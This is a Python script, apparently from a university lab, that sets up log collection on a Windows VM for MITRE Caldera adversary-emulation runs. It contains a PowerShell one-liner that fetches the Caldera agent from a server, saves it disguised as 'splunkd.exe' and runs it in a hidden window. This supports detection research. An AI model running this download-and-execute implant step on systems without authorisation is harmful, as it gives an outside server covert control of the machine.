
#!/usr/bin/env python3

# Importing socket library 
import socket
import time
import sys
import subprocess 
import psutil
import shutil
import os

import datetime
import re

import threading 
import copy

import urllib.request
import zipfile


save_directory = "C:\\Users\\puma-4\\Downloads"

HOST_IP = '128.226.116.18' # P16 (Prof Gunahua's lab) 'JY-Big machine' Host machine IP
PORT = 9999

def main():
    

    #-----------------------------------------------------------------------------------------------------------------------
    # 1. Wait and receive message of <adversary-id>" from Host
    s = socket.socket()     # Now we can create socket object
    PORT = 9900             # Lets choose one port and start listening on that port
    print(f"\n VM-socket is listing on port : {PORT}\n", flush = True)
    s.bind(('', PORT)) # Now we need to bind socket to the above port 
    s.listen(10)    # Now we will put the binded socket listening mode

    message_to_receive = None 
    while True: # We do not know when client will contact; so should be listening continously  
        conn, addr = s.accept()    # Now we can establish connection with client
        message_to_receive = conn.recv(1024).decode()
        conn.close()
        print("\n VM-socket closed the connection\n", flush=True)
        break

    if message_to_receive:
        print(f"\n From Host, received message: {message_to_receive}\n", flush = True )
    else:
        raise ValueError(f"Value-Error with received message: {message_to_receive}")
    s.close()

    adversary_id = message_to_receive

    time.sleep(5)


    os.system('w32tm /resync /force') # JY @ 2023-10-26: resync for compatiability with caldera-server time.

    #-----------------------------------------------------------------------------------------------------------------------
    # 2. Start 
    #      (2-1) Logstash
    #      (2-2) SilkService
    #      (2-3) Caldera-Agent on a Admin-Priviledged Powershell -- since need to get PROCESSSTART of splunkd.exe

    # (2-1) Start Logstash .........................................................................................
    print ('Start Logstash', flush=True)
    #PW: all following commands should run on powershell based on new event trace using sliketw->logstash->es
    # LOGSTASH_INDEX should be lower-cased.
    psh = f'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
    logstash_index_cmd= "$env:LOGSTASH_INDEX="+"\"" + adversary_id.lower() +"\"" ""
    logstash_cmd='C:\\Users\\puma-4\Desktop\\logstash-8.10.0\\bin\\logstash -f C:\\Users\puma-4\\Desktop\\logstash-8.10.0\\config\\logstash-sample.conf'
    logstash = f"{logstash_index_cmd} ; {logstash_cmd}"
    print(f"{logstash}", flush = True)

    try :
        # PW: New terminal for logstash to start listning on logstash port e.g.,5444,
        spawned_psh_process_logstash = subprocess.Popen([psh, "-Command", 
                                                         logstash],
                                                        shell=False, text=True,
                                                        stdin=subprocess.PIPE,
                                                        stdout=subprocess.PIPE,
                                                        stderr=subprocess.PIPE)
        print("spawned_psh_process_logstash.pid",spawned_psh_process_logstash.pid, flush = True)
    except:
        raise RuntimeError("Exception while starting 'spawned_psh_process_logstash'", flush = True)

    #PW: for logstash wait for few sec till logstash will start listening
    print("For logstash wait for few sec till logstash will start listening", flush = True)
    time.sleep(30) 
    
    # (2-2) Start SilkService .........................................................................................
    start_silk_service_cmd = f"Start-Service SilkService"

    try:
        spawned_psh_process_silk_service_start = subprocess.Popen([psh, "-Command", 
                                                                  start_silk_service_cmd], 
                                                                  shell=False, text=True,
                                                                  stdin=subprocess.PIPE,
                                                                  stdout=subprocess.PIPE,
                                                                  stderr=subprocess.PIPE)
        print("spawned_psh_process_silk_service_start.pid",spawned_psh_process_silk_service_start.pid, flush = True)
    except:
        raise RuntimeError("Exception while starting 'spawned_psh_process_silk_service_start'", flush = True)
    time.sleep(15)
    print("Started Silkservice, wait for 15 secs", flush = True)

    # (2-3) Start Caldera Agent (splunkd.exe) on the running Caldera-Server ...........................................
    #     
    #     --> this is based on "new_agent_for_caldera_attack_subgraph.py" from Panther-VM
    #    
    #    After the log-streaming starts (by receiving a trigger from the Host),
    #    start the Caldera-Agent the using subprocess-module (which is confirmed to work).
    #    * IMPORTANT: "Command-Prompt" that runs this python-script has "Administrator Privilege."
    #    > cmd = "$server=\"http://192.168.122.1:8888\";$url=\"$server/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;"
    #    > subprocess.run(["powershell", "-Command", cmd])
    #    ^ More Details can be found in: 
    #      "Caldera-Agent Deploy Commands OneLiner (Copy and Paste to Python).txt"

    print("Starting Caldera-agent", flush = True)
    cmd = "$server=\"http://192.168.122.1:8888\";$url=\"$server/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;"
    subprocess.run(["powershell", "-Command", cmd])
    print("Started Caldera-agent", flush = True)
     # As done in Host Machine's main file,
     # Wait 40 sec for caldera agent to get the connection with caldera server.
    time.sleep(40)
    print("Waited 40 sec for caldera-agent to get connection with caldera-server", flush = True)
    #-----------------------------------------------------------------------------------------------------------------------
    # 3. Tell Host that caldera-agent got connection withe caldera-server 
    
    print(f'Tell Host that logstash/silk-service/caldera-agent started', flush = True)
    ss = socket.socket()
    SEND_PORT = 1100
    ss.connect((HOST_IP, SEND_PORT))
    meesage_to_send = "started__logstash__silkservice__caldera_agent"
    ss.send(meesage_to_send.encode('utf-8'))
    ss.close()  # CHECK IF NECESSARY

    #-----------------------------------------------------------------------------------------------------------------------
    # 4. Host will then invoke the operation.  
    #    Wait and receive message of "terminate__logstash__silkservice" from Host

    s = socket.socket()     # Now we can create socket object
    PORT = 9900             # Lets choose one port and start listening on that port
    print(f"\n VM-socket is listing on port : {PORT}\n", flush = True)
    s.bind(('', PORT)) # Now we need to bind socket to the above port 
    s.listen(10)    # Now we will put the binded socket listening mode

    message_to_receive = None 
    while True: # We do not know when client will contact; so should be listening continously  
        conn, addr = s.accept()    # Now we can establish connection with client
        message_to_receive = conn.recv(1024).decode()
        conn.close()
        print("\n VM-socket closed the connection\n", flush=True)
        break

    if message_to_receive == "terminate__logstash__silkservice":
        print(f"\n From Host, received message: {message_to_receive}\n", flush = True )
    else:
        raise ValueError(f"Value-Error with received message: {message_to_receive}")
    s.close()
    time.sleep(5)
    
    #-----------------------------------------------------------------------------------------------------------------------
    # 5. Terminate logstash and silkservice


    stop_silk_service_cmd = f"Stop-Service SilkService"
    try:
        spawned_psh_process_silk_service_stop = subprocess.Popen([psh, "-Command", 
                                                                  stop_silk_service_cmd], 
                                                                  shell=False, text=True,
                                                                  stdin=subprocess.PIPE,
                                                                  stdout=subprocess.PIPE,
                                                                  stderr=subprocess.PIPE)
        print("spawned_psh_process_silk_service_stop.pid",spawned_psh_process_silk_service_stop.pid, flush = True)
        print("\nstopped silk-service", flush = True)
    except:
        raise RuntimeError("Exception while starting 'spawned_psh_process_silk_service_stop'", flush = True)
    time.sleep(15)

    spawned_psh_process_logstash.terminate()
    print(f"TERMINATED spawned_psh_process_logstash {spawned_psh_process_logstash.pid}",flush = True)

    spawned_psh_process_silk_service_stop.terminate()
    print(f"TERMINATED spawned_psh_process_silk_service_stop {spawned_psh_process_silk_service_stop.pid}")
    spawned_psh_process_silk_service_start.terminate()
    print(f"TERMINATED spawned_psh_process_silk_service_start {spawned_psh_process_silk_service_start.pid}")


    # shutdown fakenet




        

        

        
    # Close connection with client



if __name__ == '__main__':
    main()

